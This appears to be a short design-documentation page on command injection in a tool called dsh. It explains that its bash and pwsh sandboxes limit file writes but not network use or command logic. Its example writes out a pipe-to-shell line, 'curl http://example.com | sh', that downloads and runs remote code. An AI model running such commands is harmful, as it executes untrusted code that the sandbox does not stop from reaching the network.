---
tags: [DSH-Security]
domain: Security & Permissions
---

# Command Injection

> **Domain:** [[_dsh-security-moc|Security & Permissions]]

## Motivation

Command injection is the risk that a model or user constructs a shell command that does more than intended. dsh confines shell commands through `dsh-bash-sandbox` and `dsh-pwsh-sandbox`, which wrap each `bash -c` or `pwsh -Command` invocation through `ctx.sandbox.confine()`. The sandbox restricts file effects (writes) but does not restrict the command's own logic — a command that pipes to `curl` or reads another file is still allowed to do so. The sandbox is a file-effect boundary, not a command-semantics filter.

## Concrete Example

A `bash` call under `workspace-write` that runs `curl http://example.com | sh` is confined: the downloaded script can write only to the workspace and `/tmp`; the curl itself is not blocked because network is outside the sandbox vocabulary.

## Analogy

It is the forklift that can only carry pallets to the labeled shelf — the pallet (command) can contain anything, but the forklift (sandbox) cannot carry it off the shelf.

## Related Concepts

- [[bash-sandbox|Bash Sandbox]]
- [[network-policy|Network Policy]]
- [[sandbox|Sandbox]]
